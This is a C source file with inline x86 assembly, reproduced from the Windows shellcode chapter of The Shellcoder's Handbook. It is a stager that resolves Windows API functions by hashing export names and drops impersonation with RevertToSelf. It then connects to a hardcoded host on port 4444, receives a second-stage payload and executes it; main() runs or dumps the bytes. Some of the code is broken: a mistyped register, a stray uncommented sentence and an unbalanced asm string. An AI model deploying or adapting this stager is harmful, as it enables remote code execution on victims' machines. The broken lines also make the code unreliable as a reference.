/*

The Shellcoder's Handbook: Discovering and Exploiting Security Holes
Jack Koziol, David Litchfield, Dave Aitel, Chris Anley, 
Sinan Eren, Neel Mehta, Riley Hassell
Publisher: John Wiley & Sons
ISBN: 0764544683

Chapter 7: Windows Shellcode
Sample Program #1

Please send comments/feedback to jack@infosecinstitute.com or visit http://www.infosecinstitute.com 

*/

//released under the GNU PUBLIC LICENSE v2.0
#include <stdio.h>
#include <malloc.h>
#ifdef Win32
#include <windows.h> 
#endif

void
getprocaddr()
{

  /*GLOBAL DEFINES*/
  asm("

.set KERNEL32HASH,      0x000d4e88
.set NUMBEROFKERNEL32FUNCTIONS,0x4
.set VIRTUALPROTECTHASH, 0x38d13c
.set GETPROCADDRESSHASH,0x00348bfa
.set LOADLIBRARYAHASH,  0x000d5786
.set GETSYSTEMDIRECTORYAHASH, 0x069bb2e6
.set WS232HASH,         0x0003ab08
.set NUMBEROFWS232FUNCTIONS,0x5
.set CONNECTHASH,       0x0000677c
.set RECVHASH,          0x00000cc0
.set SENDHASH,          0x00000cd8
.set WSASTARTUPHASH,    0x00039314
.set SOCKETHASH,        0x000036a4
.set MSVCRTHASH, 0x00037908
.set NUMBEROFMSVCRTFUNCTIONS, 0x01
.set FREEHASH, 0x00000c4e
.set ADVAPI32HASH, 0x000ca608
.set NUMBEROFADVAPI32FUNCTIONS, 0x01
.set REVERTTOSELFHASH, 0x000dcdb4

");

/*START OF SHELLCODE*/
asm("

mainentrypoint:
call geteip
geteip:
pop %ebx
movl %ebx,%esp
subl $0x1000,%esp
and $0xffffff00,%esp

//set up them loop

movl $NUMBEROFKERNEL32FUNCTIONS,%ecx
lea  KERNEL32HASHESTABLE-geteip(%ebx),%esi
lea  KERNEL32FUNCTIONSTABLE-geteip(%ebx),%edi

//run the loop

getkernel32functions:

//push the hash we are looking for, which is pointed to by %esi

pushl (%esi)
pushl $KERNEL32HASH
call getfuncaddress
movl %eax,(%edi)
addl $4, %edi
addl $4, %esi
loop getkernel32functions

//GET MSVCRT FUNCTIONS

movl $NUMBEROFMSVCRTFUNCTIONS,%ecx
lea MSVCRTHASHESTABLE-geteip(%ebx),%esi
lea MSVCRTFUNCTIONSTABLE-geteip(%ebx),%edi
getmsvcrtfunctions:
pushl (%esi)
pushl $MSVCRTHASH
call getfuncaddress
movl %eax,(%edi)
addl $4, %edi
addl $4, %esi
loop getmsvcrtfunctions

//QUICKLY!
//VIRTUALPROTECT FREE +rwx

lea BUF-geteip(%ebx),%eax
pushl %eax
pushl $0x40
pushl $50
movl FREE-geteip(%ebx),%edx
pushl %edx
call *VIRTUALPROTECT-geteip(%ebx)

//restore edx as FREE

movl FREE-geteip(%ebx),%edx

//overwrite it with return!

movl $0xc3c3c3c3,(%edx)

//we leave it +rwx
//Now, we call the RevertToSelf() function so we can actually do some-thing on the machine
//You can't read ws2_32.dll in the locator exploit without this.

movl $NUMBEROFADVAPI32FUNCTIONS,%ecx
lea ADVAPI32HASHESTABLE-geteip(%ebx),%esi
lea ADVAPI32FUNCTIONSTABLE-geteip(%ebx),%edii                                                getadvapi32functions:
pushl (%esi)
pushl $ADVAPI32HASH
call getfuncaddress
movl %eax,(%edi)
addl $4,%esi
addl $4,%edi
loop getadvapi32functions
call *REVERTTOSELF-geteip(%ebx)

//call getsystemdirectoryA, then prepend to ws2_32.dll

pushl $2048
lea BUF-geteip(%ebx),%eax
pushl %eax
call *GETSYSTEMDIRECTORYA-geteip(%ebx)

//ok, now buf is loaded with the current working system directory
//we now need to append \\WS2_32.DLL to that, because
//of a bug in LoadLibraryA, which won't find WS2_32.DLL if there is a
//dot in that path

lea BUF-geteip(%ebx),%eax
findendofsystemroot:
cmpb $0,(%eax)
je foundendofsystemroot
inc %eax
jmp findendofsystemroot
foundendofsystemroot:

//eax is now pointing to the final null of C:\\windows\\system32

lea WS2_32DLL-geteip(%ebx),%esi
strcpyintobuf:
movb (%esi), %dl
movb %dl,(%eax)
test %dl,%dl
jz donewithstrcpy
inc %esi
inc %eax
jmp strcpyintobuf
donewithstrcpy:

//loadlibrarya(\"c:\\winnt\\system32\\ws2_32.dll\");

lea BUF-geteip(%ebx),%edx
pushl %edx
call *LOADLIBRARY-geteip(%ebx)

movl $NUMBEROFWS232FUNCTIONS,%ecx
lea WS232HASHESTABLE-geteip(%ebx),%esi
lea WS232FUNCTIONSTABLE-geteip(%ebx),%edi

getws232functions:

//get getprocaddress
//hash of getprocaddress

pushl (%esi)

//push hash of KERNEL32.DLL

pushl $WS232HASH
call getfuncaddress
movl %eax,(%edi)
addl $4, %esi
addl $4, %edi
loop getws232functions

//ok, now we set up BUFADDR on a quadword boundary
//esp will do since it points far above our current position

movl %esp,BUFADDR-geteip(%ebx)

//done setting up BUFADDR

movl BUFADDR-geteip(%ebx), %eax
pushl %eax
pushl $0x101
call *WSASTARTUP-geteip(%ebx)

//call socket

pushl $6
pushl $1
pushl $2
call *SOCKET-geteip(%ebx)
movl %eax,FDSPOT-geteip(%ebx)

//call connect
//push addrlen=16

push $0x10
lea SockAddrSPOT-geteip(%ebx),%esi

//the 4444 is our port

pushl %esi

//push fd

pushl %eax
call *CONNECT-geteip(%ebx)
test %eax,%eax
jl  exitthread

pushl $4
call recvloop
//ok, now the size is the first word in BUF

Now that we have the size, we read in that much shellcode into the buffer.
movl BUFADDR-geteip(%ebx),%edx
movl (%edx),%edx

//now edx has the size

push %edx

//read the data into BUF

call recvloop 

//Now we just execute it.

movl BUFADDR-geteip(%ebx),%edx
call *%edx 

//recvloop function

 asm("

//START FUNCTION RECVLOOP
//arguments: size to be read
//reads into *BUFADDR

recvloop:
pushl %ebp
movl %esp,%ebp
push %edx
push %edi

//get arg1 into edx

movl 0x8(%ebp), %edx
movl BUFADDR-geteip(%ebx),%edi

callrecvloop:

//not an argument- but recv() messes up edx! So we save it off here

pushl %edx

//flags

pushl $0

//len

pushl $1

//*buf

pushl %edi
movl FDSPOT-geteip(%ebx),%eax
pushl %eax
call *RECV-geteip(%ebx)

//prevents getting stuck in an endless loop if the server closes the connection

cmp $0xffffffff,%eax
je exitthread


popl %edx

//subtract how many we read

sub %eax,%edx

//move buffer pointer forward

add %eax,%edi

//test if we need to exit the function
//recv returned 0

test %eax,%eax
je donewithrecvloop

//we read all the data we wanted to read

test %edx,%edx
je donewithrecvloop
jmp callrecvloop


donewithrecvloop:

//done with recvloop

pop %edi
pop %edx
mov %ebp, %esp
pop %ebp
ret $0x04

//END FUNCTION

/* fs[0x30] is pointer to PEB
   *that + 0c is _PEB_LDR_DATA pointer
   *that + 0c is in load order module list pointer

*/

//void* GETFUNCADDRESS( int hash1,int hash2)

/*START OF CODE THAT GETS THE ADDRESSES*/
//arguments
//hash of dll
//hash of function
//returns function address

getfuncaddress:
pushl %ebp
movl %esp,%ebp
pushl %ebx
pushl %esi
pushl %edi
pushl %ecx

pushl %fs:(0x30)
popl %eax

//test %eax,%eax
//JS WIN9X

NT:

//get _PEB_LDR_DATA ptr

movl 0xc(%eax),%eax

//get first module pointer list

movl 0xc(%eax),%ecx



nextinlist:

//next in the list into %edx

movl (%ecx),%edx

//this is the unicode name of our module

movl 0x30(%ecx),%eax

//compare the unicode string at %eax to our string
//if it matches KERNEL32.dll, then we have our module address at 0x18+%ecx
//call hash match
//push unicode increment value

pushl $2

//push hash

movl 8(%ebp),%edi
pushl %edi

//push string address

pushl %eax
call hashit
test %eax,%eax
jz  foundmodule

//otherwise check the next node in the list

movl %edx,%ecx
jmp nextinlist

//FOUND THE MODULE, GET THE PROCEDURE

foundmodule:

//we are pointing to the winning list entry with ecx 
//get the base address

movl 0x18(%ecx),%eax

//we want to save this off since this is our base that we will have to add 

push %eax

//ok, we are now pointing at the start of the module (the MZ for
//the dos header IMAGE_DOS_HEADER.e_lfanew is what we want
//to go parse (the PE header itself)

movl 0x3c(%eax),%ebx
addl %ebx,%eax

//%ebx is now pointing to the PE header (ascii PE)
//PE->export table is what we want
//0x150-0xd8=0x78 according to OllydDbg

movl 0x78(%eax),%ebx

//eax is now the base again!

pop %eax 
push %eax
addl %eax,%ebx

//this eax is now the Export Directory Table
//From MS PE-COFF table, 6.3.1 (search for pecoff at MS Site to download)
//Offset Size Field                         Description
//16     4    Ordinal Base (usually set to one!) 
//24     4    Number of Name pointers       (also the number of ordi-nals)
//28     4    Export Address Table RVA      Address of the EAT rela-tive to base
//32     4    Name Pointer Table RVA        Addresses (RVA's) of Names!
//36     4    Ordinal Table RVA             You need the ordinals to get the addresses

//theoretically we need to subtract the ordinal base, but it turns out they don't actually use it

//movl 16(%ebx),%edi
//edi is now the ordinal base!

movl 28(%ebx),%ecx

//ecx is now the address table

movl 32(%ebx),%edx

//edx is the name pointer table

movl 36(%ebx),%ebx

//ebx is the ordinal table

//eax is now the base address again
//correct those RVA's into actual addresses

addl %eax,%ecx
addl %eax,%edx
addl %eax,%ebx

////HERE IS WHERE WE FIND THE FUNCTION POINTER ITSELF


find_procedure:

//for each pointer in the name pointer table, match against our hash
//if the hash matches, then we go into the address table and get the
//address using the ordinal table

movl (%edx),%esi
pop %eax
pushl %eax
addl %eax,%esi

//push the hash increment - we are ascii

pushl $1

//push the function hash

pushl 12(%ebp)

//esi has the address of our actual string

pushl %esi
call hashit
test %eax, %eax
jz found_procedure

//increment our pointer into the name table

add $4,%edx

//increment out pointer into the ordinal table
//ordinals are only 16 bits

add $2,%ebx 
jmp find_procedure

found_procedure:

//set eax to the base address again

pop %eax
xor %edx,%edx

//get the ordinal into dx
//ordinal=ExportOrdinalTable[i] (pointed to by ebx)

mov (%ebx),%dx

//SymbolRVA = ExportAddressTable[ordinal-OrdinalBase]
//see note above for lack of ordinal base use
//subtract ordinal base
//sub %edi,%edx
//multiply that by sizeof(dword)

shl $2,%edx

//add that to the export address table (dereference in above .c statement)
//to get the RVA of the actual address

add %edx,%ecx

//now add that to the base and we get our actual address

add (%ecx),%eax

//done eax has the address!

popl %ecx
popl %edi
popl %esi
popl %ebx
mov %ebp,%esp
pop %ebp
ret $8

//hashit function
//takes 3 args
//increment for unicode/ascii
//hash to test against
//address of string

hashit:
pushl %ebp
movl %esp,%ebp

push %ecx
push %ebx
push %edx

xor %ecx,%ecx
xor %ebx,%ebx
xor %edx,%edx

mov 8(%ebp),%eax
hashloop:
movb (%eax),%dl

//convert char to upper case

or $0x60,%dl
add %edx,%ebx
shl $1,%ebx

//add increment to the pointer
//2 for unicode, 1 for ascii

addl 16(%ebp),%eax
mov (%eax),%cl
test %cl,%cl
loopnz hashloop
xor %eax,%eax
mov 12(%ebp),%ecx
cmp %ecx,%ebx
jz donehash

//failed to match, set eax==1

inc %eax
donehash:
pop %edx
pop %ebx
pop %ecx
mov %ebp,%esp
pop %ebp
ret $12

exitthread:
//just cause an exception
xor %eax,%eax
call *%eax

SockAddrSPOT:

//first 2 bytes are the PORT (then AF_INET is 0002)

.long 0x44440002

//server ip 651a8c0 is 192.168.1.101

.long 0x6501a8c0
KERNEL32HASHESTABLE:
.long GETSYSTEMDIRECTORYAHASH
.long VIRTUALPROTECTHASH
.long GETPROCADDRESSHASH
.long LOADLIBRARYAHASH

MSVCRTHASHESTABLE:
.long FREEHASH

ADVAPI32HASHESTABLE:
.long REVERTTOSELFHASH

WS232HASHESTABLE:
.long CONNECTHASH
.long RECVHASH
.long SENDHASH
.long WSASTARTUPHASH
.long SOCKETHASH

WS2_32DLL:
.ascii \"ws2_32.dll\"
.long 0x00000000

endsploit:

//nothing below this line is actually included in the shellcode, but it
//is used for scratch space when the exploit is running.

MSVCRTFUNCTIONSTABLE:
FREE:
     .long 0x00000000

KERNEL32FUNCTIONSTABLE:
VIRTUALPROTECT:
     .long 0x00000000
GETPROCADDRA:
     .long 0x00000000
LOADLIBRARY:
     .long 0x00000000

//end of kernel32.dll functions table
//this stores the address of buf+8 mod 8, since we
//are not guaranteed to be on a word boundary, and we
//want to be so Win32 api works

BUFADDR: 
     .long 0x00000000

     
     WS232FUNCTIONSTABLE:
CONNECT:
     .long 0x00000000
RECV:
     .long 0x00000000
SEND:
     .long 0x00000000
WSASTARTUP:
     .long 0x00000000
SOCKET:
     .long 0x00000000

//end of ws2_32.dll functions table

SIZE:
     .long 0x00000000

FDSPOT:
     .long 0x00000000
BUF:
     .long 0x00000000
     
     ");

}

int main()
{
        unsigned char buffer[4000]; 
        unsigned char * p;
        int i;
        char *mbuf,*mbuf2;
        int error=0;
        //getprocaddr();
        memcpy(buffer,getprocaddr,2400);
        p=buffer;
        p+=3; /*skip prelude of function*/

//#define DOPRINT

#ifdef DOPRINT

/*gdb ) printf "%d\n", endsploit - mainentrypoint -1 */

        printf("\"");
        for (i=0; i<666; i++)
          {
                printf("\\x%2.2x",*p);
                if ((i+1)%8==0)
                  printf("\"\nshellcode+=\"");
                p++;
          }

        printf("\"\n");
#endif

#define DOCALL
#ifdef DOCALL
((void(*)())(p)) ();
#endif


}



